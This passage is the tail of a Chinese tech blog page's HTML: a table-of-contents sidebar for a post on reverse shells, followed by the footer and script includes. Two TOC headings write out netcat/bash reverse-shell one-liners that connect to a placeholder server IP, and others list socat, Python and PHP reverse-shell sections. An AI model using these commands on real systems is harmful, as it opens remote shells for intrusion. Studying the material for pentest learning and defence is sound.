href="#“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处："><span class="nav-number">1.0.10.2.</span> <span class="nav-text">“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#都是进程间通讯的手段，可用于传递消息"><span class="nav-number">1.0.10.3.</span> <span class="nav-text">都是进程间通讯的手段，可用于传递消息</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#都是“半双工单向”数据流模式"><span class="nav-number">1.0.10.4.</span> <span class="nav-text">都是“半双工单向”数据流模式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但不同之处在于："><span class="nav-number">1.0.10.5.</span> <span class="nav-text">但不同之处在于：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#“PIPE”创建的管道存在于父-子进程之间，通常是fork-出来的父子进程间使用。"><span class="nav-number">1.0.10.6.</span> <span class="nav-text">“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。"><span class="nav-number">1.0.10.7.</span> <span class="nav-text">“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#想知道的更详细些可以阅读经典的《UNIX环境高级编程》。"><span class="nav-number">1.0.10.8.</span> <span class="nav-text">想知道的更详细些可以阅读经典的《UNIX环境高级编程》。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-思考一下下面的两个命令有什么不同？"><span class="nav-number">1.0.10.9.</span> <span class="nav-text">2. 思考一下下面的两个命令有什么不同？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nc-lt-Server-IP-gt-8888-lt-tmp-f-bash-i-2-gt-amp-1-gt-tmp-f"><span class="nav-number">1.0.10.10.</span> <span class="nav-text">nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i 2&gt;&amp;1 &gt; /tmp/f</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nc-lt-Server-IP-gt-8888-lt-tmp-f-bash-i-gt-tmp-f-2-gt-amp-1"><span class="nav-number">1.0.10.11.</span> <span class="nav-text">nc &lt;Server IP&gt; 8888 &lt; /tmp/f | bash -i  &gt; /tmp/f 2&gt;&amp;1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不同之处是2-gt-amp-1-gt-tmp-f和-gt-tmp-f-2-gt-amp-1。"><span class="nav-number">1.0.10.12.</span> <span class="nav-text">不同之处是2&gt;&amp;1 &gt; /tmp/f和&gt; /tmp/f 2&gt;&amp;1。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#gt-tmp-f-2-gt-amp-1可以正确将标准输出与标准错误合并后导入-tmp-f，而2-gt-amp-1-gt-tmp-f最终只把标准输出导入了-tmp-f，标准错误还是没有，那么是为什么呢？"><span class="nav-number">1.0.10.13.</span> <span class="nav-text">&gt; /tmp/f 2&gt;&amp;1可以正确将标准输出与标准错误合并后导入/tmp/f，而2&gt;&amp;1 &gt; /tmp/f最终只把标准输出导入了/tmp/f，标准错误还是没有，那么是为什么呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#先分析一下正常-gt-tmp-f-2-gt-amp-1的执行过程。"><span class="nav-number">1.0.10.14.</span> <span class="nav-text">先分析一下正常&gt; /tmp/f 2&gt;&amp;1的执行过程。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#先解析-gt-tmp-f的时候进程会把标准输出1定向到FIFO文件-tmp-f"><span class="nav-number">1.0.10.15.</span> <span class="nav-text">先解析&gt; /tmp/f的时候进程会把标准输出1定向到FIFO文件/tmp/f</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#再解析2-gt-amp-1的时候，进程的标准错误2定向到了标准输出1对应的目标，由于此时1指向了-tmp-f，那么自然标准错误2也被定向到了这个FIFO文件。"><span class="nav-number">1.0.10.16.</span> <span class="nav-text">再解析2&gt;&amp;1的时候，进程的标准错误2定向到了标准输出1对应的目标，由于此时1指向了/tmp/f，那么自然标准错误2也被定向到了这个FIFO文件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#再分析一下异常2-gt-amp-1-gt-tmp-f的执行过程。"><span class="nav-number">1.0.10.17.</span> <span class="nav-text">再分析一下异常2&gt;&amp;1 &gt; /tmp/f的执行过程。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#首先2-gt-amp-1在执行的时候是把进程的标准错误2定向到了标准输出1对应的目标，这个目标此时是进程执行的终端。"><span class="nav-number">1.0.10.18.</span> <span class="nav-text">首先2&gt;&amp;1在执行的时候是把进程的标准错误2定向到了标准输出1对应的目标，这个目标此时是进程执行的终端。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当解析到-gt-tmp-f的时候进程会把标准输出1定向到FIFO文件-tmp-f，而此时标准错误2还是指向前一步中定向的终端，因此造成了执行的问题。"><span class="nav-number">1.0.10.19.</span> <span class="nav-text">当解析到&gt; /tmp/f的时候进程会把标准输出1定向到FIFO文件/tmp/f，而此时标准错误2还是指向前一步中定向的终端，因此造成了执行的问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通常的bash一句话"><span class="nav-number">1.0.10.20.</span> <span class="nav-text">通常的bash一句话</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bash反弹一句话的拆分"><span class="nav-number">1.0.10.21.</span> <span class="nav-text">bash反弹一句话的拆分</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP-8080-会话连接）相结合，然后在重定向个tcp-8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash-反弹环境。"><span class="nav-number">1.0.10.22.</span> <span class="nav-text">bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#php脚本反弹："><span class="nav-number">1.0.10.23.</span> <span class="nav-text">php脚本反弹：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#socat反弹一句话"><span class="nav-number">1.0.11.</span> <span class="nav-text">socat反弹一句话</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Socat是Linux-下一个多功能的网络工具，名字来由是”-Socket-CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情-，其功能与netcat类似，不过据说可以看做netcat的加强版-事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。"><span class="nav-number">1.0.11.1.</span> <span class="nav-text">Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情 ，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#有关socat二进制可执行文件，大家可以到这个链接下载：https-github-com-andrew-d-static-binaries-raw-master-binaries-linux-x86-64-socat"><span class="nav-number">1.0.11.2.</span> <span class="nav-text">有关socat二进制可执行文件，大家可以到这个链接下载：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kali中"><span class="nav-number">1.0.12.</span> <span class="nav-text">kali中</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#另一台靶机运行socat反弹shell"><span class="nav-number">1.0.12.1.</span> <span class="nav-text">另一台靶机运行socat反弹shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#python脚本反弹"><span class="nav-number">1.0.12.2.</span> <span class="nav-text">python脚本反弹</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-proc-open双管道，多线程执行命令"><span class="nav-number">1.0.13.</span> <span class="nav-text">0x03 proc_open双管道，多线程执行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#采用cli的方式运行PHP脚本"><span class="nav-number">1.0.13.1.</span> <span class="nav-text">采用cli的方式运行PHP脚本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#STDIN：读取脚本的输入字符"><span class="nav-number">1.0.13.2.</span> <span class="nav-text">STDIN：读取脚本的输入字符</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#从命令行输入字符，能看到打印对应的字符；其中fread会阻塞进程。"><span class="nav-number">1.0.13.3.</span> <span class="nav-text">从命令行输入字符，能看到打印对应的字符；其中fread会阻塞进程。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP开启一个子进程"><span class="nav-number">1.0.14.</span> <span class="nav-text">PHP开启一个子进程</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#index-php"><span class="nav-number">1.0.14.1.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#proc-php"><span class="nav-number">1.0.14.2.</span> <span class="nav-text">proc.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#运行index-php，提示请输入，当输入字符之后，index将输入的打印出来，等待3秒之后，proc又将收到的字符返回给index，由index再次打印出来。效果如下："><span class="nav-number">1.0.14.3.</span> <span class="nav-text">运行index.php，提示请输入，当输入字符之后，index将输入的打印出来，等待3秒之后，proc又将收到的字符返回给index，由index再次打印出来。效果如下：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#proc-open-file-descriptorspec-pipes"><span class="nav-number">1.0.15.</span> <span class="nav-text">proc_open($file,$descriptorspec,$pipes)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#开启一个子进程。"><span class="nav-number">1.0.15.1.</span> <span class="nav-text">开启一个子进程。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#file-子进程要打开的脚本"><span class="nav-number">1.0.15.2.</span> <span class="nav-text">$file:子进程要打开的脚本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#descriptorspec-输入输出读取的配置文件，数组"><span class="nav-number">1.0.15.3.</span> <span class="nav-text">$descriptorspec: 输入输出读取的配置文件，数组</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反弹shell命令总结"><span class="nav-number">1.0.16.</span> <span class="nav-text">反弹shell命令总结</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#bash版本："><span class="nav-number">1.0.16.1.</span> <span class="nav-text">bash版本：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意这个是由解析shell的bash完成，所以某些情况下不支持"><span class="nav-number">1.0.16.2.</span> <span class="nav-text">注意这个是由解析shell的bash完成，所以某些情况下不支持</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#python版本："><span class="nav-number">1.0.16.3.</span> <span class="nav-text">python版本：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#php版本："><span class="nav-number">1.0.16.4.</span> <span class="nav-text">php版本：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nc版本："><span class="nav-number">1.0.16.5.</span> <span class="nav-text">nc版本：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接："><span class="nav-number">1.0.17.</span> <span class="nav-text">参考链接：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Linux-nc命令与反弹shell"><span class="nav-number">1.0.17.1.</span> <span class="nav-text">Linux nc命令与反弹shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#linux各种一句话反弹shell总结"><span class="nav-number">1.0.17.2.</span> <span class="nav-text">linux各种一句话反弹shell总结</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#各种环境下反弹-shell-的方法"><span class="nav-number">1.0.17.3.</span> <span class="nav-text">各种环境下反弹 shell 的方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#渗透测试-反弹与转发小结"><span class="nav-number">1.0.17.4.</span> <span class="nav-text">渗透测试:反弹与转发小结</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">63.9k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
